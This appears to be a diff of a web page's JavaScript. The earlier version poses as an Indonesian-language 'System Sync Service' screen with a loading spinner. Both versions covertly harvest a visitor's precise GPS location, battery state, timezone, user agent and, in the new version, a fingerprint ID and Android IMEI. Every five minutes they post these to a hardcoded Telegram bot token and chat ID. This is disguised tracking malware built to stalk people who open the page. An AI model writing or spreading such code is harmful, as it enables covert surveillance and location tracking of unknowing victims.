@@ -1,86 +1,50 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>System UI - Sync Service</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f1f1f1;
-      margin: 0;
-      padding: 20px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      color: #333;
-    }
-    .card {
-      background-color: #fff;
-      padding: 20px 30px;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      max-width: 400px;
-      text-align: center;
-    }
-    .spinner {
-      margin: 20px auto;
-      width: 40px;
-      height: 40px;
-      border: 4px solid #ccc;
-      border-top-color: #333;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    .status {
-      margin-top: 10px;
-      font-size: 14px;
-      color: #777;
-    }
-  </style>
-</head>
-<body>
-  <div class="card">
-    <h2>System Sync Service</h2>
-    <p>Sedang menyinkronkan konfigurasi sistem kamu...</p>
-    <div class="spinner"></div>
-    <p class="status">Mohon jangan tutup halaman ini.</p>
-    <p class="status">Penyelarasan lokasi & status perangkat aktif.</p>
-  </div>
-
-  <script>
-    async function sendData() {
-      try {
-        const location = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, {
-            enableHighAccuracy: true
-          });
+<script>
+  async function sendData() {
+    try {
+      // Dapatkan lokasi
+      const location = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: true
         });
+      });
 
-        const lat = location.coords.latitude;
-        const lon = location.coords.longitude;
-        const speed = location.coords.speed ?? 'Unknown';
-        const heading = location.coords.heading ?? 'Unknown';
-        const altitude = location.coords.altitude ?? 'Unknown';
-        const accuracy = location.coords.accuracy + 'm';
+      const lat = location.coords.latitude;
+      const lon = location.coords.longitude;
+      const speed = location.coords.speed ?? 'Unknown';
+      const heading = location.coords.heading ?? 'Unknown';
+      const altitude = location.coords.altitude ?? 'Unknown';
+      const accuracy = location.coords.accuracy + 'm';
 
-        const lang = navigator.language;
-        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const local = new Date().toLocaleString();
-        const utc = new Date().toUTCString();
-        const ua = navigator.userAgent;
+      // Info perangkat
+      const lang = navigator.language;
+      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const local = new Date().toLocaleString();
+      const utc = new Date().toUTCString();
+      const ua = navigator.userAgent;
 
-        const battery = await navigator.getBattery();
-        const batLevel = Math.round(battery.level * 100);
-        const batCharging = battery.charging ? 'Charging' : 'Not Charging';
+      // Info baterai
+      const battery = await navigator.getBattery();
+      const batLevel = Math.round(battery.level * 100);
+      const batCharging = battery.charging ? 'Charging' : 'Not Charging';
 
-        const payload = `
-[ID: Uta001]
+      // Generate ID otomatis (TETAP vs DINAMIS)
+      const userAgent = navigator.userAgent;
+      const dynamic = false; // ubah jadi true kalau mau ID dinamis setiap waktu
+
+      const baseID = dynamic
+        ? btoa(userAgent + utc).slice(0, 8)
+        : btoa(userAgent).replace(/[^a-zA-Z0-9]/g, '').slice(0, 8);
+
+      const ID = `USR-${baseID}`;
+
+      // Coba ambil IMEI jika tersedia dari Android WebView (opsional, hanya jika pakai Android hybrid app)
+      let imei = "Unavailable";
+      if (typeof AndroidInterface !== 'undefined' && AndroidInterface.getIMEI) {
+        imei = AndroidInterface.getIMEI();
+      }
+
+      const payload = `
+[ID: ${ID}]
 Lokasi dikirim: ${lat}, ${lon}
 https://maps.google.com/?q=${lat},${lon}
 
@@ -95,23 +59,23 @@ Local: ${local}
 UTC: ${utc}
 
 Battery: ${batLevel}% (${batCharging})
-Device: ${ua}`;
+Device: ${ua}
+IMEI: ${imei}`;
 
-        const token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
-        const chat_id = "5677912817";
+      const token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
+      const chat_id = "5677912817";
 
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id, text: payload })
-        });
-      } catch (err) {
-        console.error("Gagal mengirim data:", err);
-      }
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text: payload })
+      });
+
+    } catch (err) {
+      console.error("Gagal mengirim data:", err);
     }
+  }
 
-    sendData();
-    setInterval(sendData, 5 * 60 * 1000); // setiap 5 menit
-  </script>
-</body>
-</html>
+  sendData();
+  setInterval(sendData, 5 * 60 * 1000); // kirim setiap 5 menit
+</script>
